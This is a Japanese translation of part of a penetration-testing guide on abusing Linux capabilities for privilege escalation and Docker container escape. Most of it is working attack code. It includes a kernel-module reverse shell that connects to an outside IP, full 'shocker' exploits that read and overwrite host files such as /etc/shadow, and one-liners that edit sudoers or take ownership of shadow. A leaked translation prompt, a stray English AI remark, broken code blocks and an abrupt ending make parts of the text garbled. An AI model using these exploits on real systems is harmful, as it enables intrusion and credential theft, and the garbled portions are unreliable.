/bin/kmod = cap_sys_module+ep
```
以下は、特権昇格に関するLinuxのセキュリティ強化についてのハッキング技術に関する本の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

これは、**`insmod`** コマンドを使用してカーネルモジュールを挿入できることを意味します。以下の例に従って、この特権を悪用して**リバースシェル**を取得します。

**環境を使った例 (Docker breakout)**

Dockerコンテナ内で有効になっている機能を以下の使用で確認できます：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、**SYS\_MODULE** ケーパビリティが有効になっていることがわかります。

リバースシェルを実行する**カーネルモジュール**と、それを**コンパイル**するための**Makefile**を**作成**します：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
```
{% endcode %}

{% code title="Makefile" %}
```
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile内の各make単語の前の空白文字は**タブでなければならず、スペースではいけません**！
{% endhint %}

`make`を実行してコンパイルします。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、シェル内で `nc` を起動し、別のシェルから**モジュールをロード**すると、ncプロセスでシェルがキャプチャされます：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この技術のコードは、「Abusing SYS\_MODULE Capability」の実験室からコピーされました。** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

この技術の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)で見つけることができます。

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、プロセスが**ファイル読み取り、ディレクトリの読み取りと実行権限をバイパスする**ことを可能にします。これはファイルの検索や読み取りに使用されることを意図していましたが、プロセスに `open_by_handle_at(2)` を呼び出す権限も与えます。`CAP_DAC_READ_SEARCH` の能力を持つ任意のプロセスは、`open_by_handle_at(2)` を使用して、マウント名前空間の外にある任意のファイルにアクセスすることができます。`open_by_handle_at(2)` に渡されるハンドルは、`name_to_handle_at(2)` を使用して取得される不透明な識別子であることを意図しています。しかし、このハンドルには、inode番号などの機密性が高く改ざん可能な情報が含まれています。これは、Sebastian KrahmerによってDockerコンテナで初めて問題とされ、[shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)エクスプロイトで示されました。\
**つまり、ファイル読み取り権限のチェックとディレクトリの読み取り/実行権限のチェックをバイパスすることができます。**

**バイナリを使用した例**

バイナリは任意のファイルを読むことができます。したがって、tarのようなファイルにこの能力がある場合、shadowファイルを読むことができます：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Example with binary2**

このケースでは、**`python`** バイナリがこの機能を持っているとしましょう。ルートファイルをリストするには、以下のようにします：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
ファイルを読むためには、以下の操作を行うことができます：
```python
print(open("/etc/shadow", "r").read())
```
**環境での例 (Docker breakout)**

Dockerコンテナ内で有効になっているcapabilitiesを以下の使用で確認できます:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、**DAC\_READ\_SEARCH** 機能が有効になっていることがわかります。その結果、コンテナは**プロセスをデバッグ**することができます。

以下のエクスプロイトがどのように機能するかは[https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で学ぶことができますが、要約すると**CAP\_DAC\_READ\_SEARCH**は、ファイルシステムを権限チェックなしで移動するだけでなく、_**open\_by\_handle\_at(2)**_ へのチェックを明示的に削除し、**他のプロセスによって開かれた機密ファイルへのプロセスのアクセスを可能にする**こともあります。

この権限を悪用してホストからファイルを読み取る元のエクスプロイトはこちらで見つけることができます: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)、以下は**最初の引数として読みたいファイルを指定し、それをファイルにダンプすることを可能にする修正版です。**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
エクスプロイトはホストにマウントされている何かへのポインターを見つける必要があります。元のエクスプロイトはファイル /.dockerinit を使用しており、この変更されたバージョンは /etc/hostname を使用します。エクスプロイトが機能していない場合は、異なるファイルを設定する必要があるかもしれません。ホストにマウントされているファイルを見つけるには、単に mount コマンドを実行します：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**この技術のコードは "Abusing DAC\_READ\_SEARCH Capability" の実験室からコピーされました** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン**で最も重要なサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術知識の普及を使命として、この会議はあらゆる分野の技術とサイバーセキュリティの専門家のための活発な交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**これは、任意のファイルの書き込み権限チェックをバイパスできることを意味します。つまり、任意のファイルに書き込むことができます。**

権限昇格のために**上書きできる多くのファイルがあります。**[**こちらからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリを使用した例**

この例では vim がこの機能を持っているため、_passwd_、_sudoers_、_shadow_ などの任意のファイルを変更できます：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**バイナリ2の例**

この例では、**`python`** バイナリがこの機能を持っています。pythonを使用して任意のファイルを上書きできます：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境 + CAP\_DAC\_READ\_SEARCH を使用した例 (Docker 脱出)**

Docker コンテナ内で有効な機能を確認するには、次のコマンドを使用します:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
まず、ホストの任意のファイルを読むために[**DAC\_READ\_SEARCH機能を悪用する前のセクションを読んでください**](linux-capabilities.md#cap\_dac\_read\_search)し、エクスプロイトを**コンパイル**します。
次に、ホストのファイルシステム内に任意のファイルを**書き込むことを可能にするshockerエクスプロイトの以下のバージョンをコンパイルしてください**：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Dockerコンテナから脱出するために、ホストから`/etc/shadow`と`/etc/passwd`ファイルを**ダウンロード**し、それらに**新しいユーザー**を**追加**して、**`shocker_write`**を使用して上書きします。その後、**ssh**経由で**アクセス**します。

**この技術のコードは"Abusing DAC\_OVERRIDE Capability"の実験室からコピーされました** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**これは、任意のファイルの所有権を変更できることを意味します。**

**バイナリの例**

**`python`**バイナリにこの機能があると仮定すると、**shadow**ファイルの**所有者**を**変更**し、**rootパスワード**を変更して権限を昇格させることができます：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、この機能を持つ**`ruby`**バイナリを使用して：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**これは、任意のファイルの権限を変更できることを意味します。**

**バイナリの例**

pythonにこの機能がある場合、shadowファイルの権限を変更し、**rootパスワードを変更し**、権限を昇格させることができます：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**これは、作成されたプロセスの有効なユーザーIDを設定できることを意味します。**

**バイナリを使用した例**

pythonにこの**capability**がある場合、非常に簡単に悪用してroot権限に昇格することができます：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**これは、作成されたプロセスの有効なグループIDを設定できることを意味します。**

権限を昇格させるために**上書きできる多くのファイルがあります。**[**こちらからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリの例**

この場合、任意のグループになりすますことができるので、グループが読める興味深いファイルを探すべきです：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一度権限昇格のために悪用できるファイル（読み取りまたは書き込みを通じて）を見つけたら、以下の方法で**興味深いグループを偽装したシェルを取得**できます：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
この場合、グループshadowが偽装されたので、ファイル`/etc/shadow`を読むことができます：
```bash
cat /etc/shadow
```
**docker**がインストールされている場合、**dockerグループ**になりすまして、[**dockerソケット**を使用して権限を昇格させる](./#writable-docker-socket)ことができます。

## CAP\_SETFCAP

**これはファイルやプロセスに機能を設定できることを意味します**

**バイナリの例**

pythonにこの**機能**がある場合、非常に簡単に権限をrootに昇格させることができます：

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
Since the provided text appears to be a closing tag for a code block in markdown syntax, there is no actual content to translate. If you have any specific content that needs translation, please provide the text.
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
バイナリにCAP\_SETFCAPを使用して新しい機能を設定すると、この機能を失うことに注意してください。
{% endhint %}

[SETUID機能](linux-capabilities.md#cap\_setuid)を持っている場合、権限昇格の方法を見るためにそのセクションに進むことができます。

**環境を使った例 (Docker breakout)**

デフォルトでは、**CAP\_SETFCAPはDocker内のコンテナのプロセスに与えられます**。次のようなことをして確認できます：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この機能は、**バイナリに他の任意の機能を与えることを可能にします**ので、このページで述べられている他の機能ブレイクアウトを**悪用して**コンテナから**脱出**することを考えることができます。
しかし、例えばgdbバイナリにCAP\_SYS\_ADMINとCAP\_SYS\_PTRACEの機能を与えようとすると、与えることはできますが、**この後バイナリは実行できなくなります**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
調査した結果、以下のように読みました： _Permitted: これはスレッドが想定できる有効な機能の**制限された上位集合**です。また、有効なセットに**CAP\_SETPCAP**機能を持たないスレッドが継承可能セットに追加できる機能の制限された上位集合でもあります。_\
Permitted機能は使用できる機能を制限するようです。\
しかし、Dockerはデフォルトで**CAP\_SETPCAP**も付与するので、継承可能なものの中で**新しい機能を設定できる**かもしれません。\
しかし、このcapのドキュメントには： _CAP\_SETPCAP : \[…] **呼び出しスレッドのバウンディングセットから継承可能セットに任意の機能を追加**します。_\
バウンディングセットから継承可能セットに機能を追加することしかできないようです。つまり、**CAP\_SYS\_ADMINやCAP\_SYS\_PTRACEのような新しい機能を継承セットに入れて権限を昇格させることはできない**ということです。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`/dev/mem`、`/dev/kmem`または`/proc/kcore`へのアクセス、`mmap_min_addr`の変更、`ioperm(2)`および`iopl(2)`システムコールへのアクセス、さまざまなディスクコマンドなど、多くの機密操作を提供します。`FIBMAP ioctl(2)`もこの機能を介して有効になり、[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしました。manページによると、これにより保持者は`他のデバイスに対してデバイス固有の操作を記述的に実行する`こともできます。

これは**権限昇格**と**Docker脱出**に役立ちます。

## CAP\_KILL

**これは任意のプロセスを終了できることを意味します。**

**バイナリの例**

**`python`**バイナリがこの機能を持っているとしましょう。もし**何らかのサービスやソケットの設定**（またはサービスに関連する任意の設定ファイル）を変更することもできれば、バックドアを仕掛け、そのサービスに関連するプロセスを終了させ、新しい設定ファイルがバックドア付きで実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**killを使った権限昇格**

kill機能を持っていて、**rootとして実行されているnodeプログラム**（または別のユーザーとして）がある場合、**SIGUSR1シグナルを送信**して、**nodeデバッガーを開く**ことができるかもしれません。そこに接続できます。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も重要なサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。**技術知識の普及を使命として**、この会議はあらゆる分野の技術およびサイバーセキュリティ専門家のための活発な交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**これは、特権ポートを含む任意のポートでリッスンすることが可能であることを意味します。** この機能を使って直接権限を昇格させることはできません。

**バイナリの例**

もし **`python`** がこの機能を持っている場合、任意のポートでリッスンし、特定の特権ポートからの接続を要求するサービスに対しても、それを使って接続することができます。

{% tabs %}
{% tab title="リッスン" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="接続" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、プロセスが利用可能なネットワーク名前空間に対して **RAWおよびPACKETソケットタイプを作成する** ことを可能にします。これにより、露出したネットワークインターフェースを通じて任意のパケット生成と送信が可能になります。多くの場合、このインターフェースは仮想イーサネットデバイスであり、**悪意のある** または **侵害されたコンテナ** が様々なネットワーク層で **パケットを偽装** することができます。この機能を持つ悪意のあるプロセスまたは侵害されたコンテナは、アップストリームブリッジに注入したり、コンテナ間のルーティングを悪用したり、ネットワークアクセス制御を回避したり、ファイアウォールがパケットの種類と内容を制限するために設置されていない場合には、ホストのネットワーキングを改ざんする可能性があります。最終的に、この機能により、プロセスは利用可能な名前空間内の任意のアドレスにバインドすることができます。この機能は、コンテナからICMPリクエストを作成するためにRAWソケットを使用するpingが機能するように、特権コンテナによってしばしば保持されます。

**つまり、トラフィックを嗅ぎ取ることが可能です。** この機能を使って直接権限を昇格することはできません。

**バイナリの例**

もしバイナリ **`tcpdump`** がこの機能を持っている場合、ネットワーク情報をキャプチャするために使用することができます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
**環境**がこの機能を提供している場合、**`tcpdump`** を使用してトラフィックを嗅ぎ取ることもできます。

**バイナリ2の例**

次の例は、"**lo**"（**localhost**）インターフェースのトラフィックを傍受するために役立つ **`python2`** コードです。このコードは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) のラボ "_The Basics: CAP-NET\_BIND + NET\_RAW_" からのものです。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、能力を持つユーザーが**公開されたネットワーク名前空間のファイアウォール、ルーティングテーブル、ソケットの権限**を変更できるようにします。また、公開されたネットワークインターフェースの設定やその他関連する設定を変更することもできます。これには、接続されたネットワークインターフェースの**プロミスキャスモードを有効にする**能力も含まれ、名前空間を越えてスニッフィングする可能性もあります。

**バイナリを使った例**

例えば、**python バイナリ**がこれらの能力を持っているとしましょう。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**これはinode属性を変更できることを意味します。** この機能を直接使用して権限を昇格することはできません。

**バイナリの例**

ファイルが不変であり、pythonがこの機能を持っている場合、**不変属性を削除してファイルを変更可能にすることができます：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

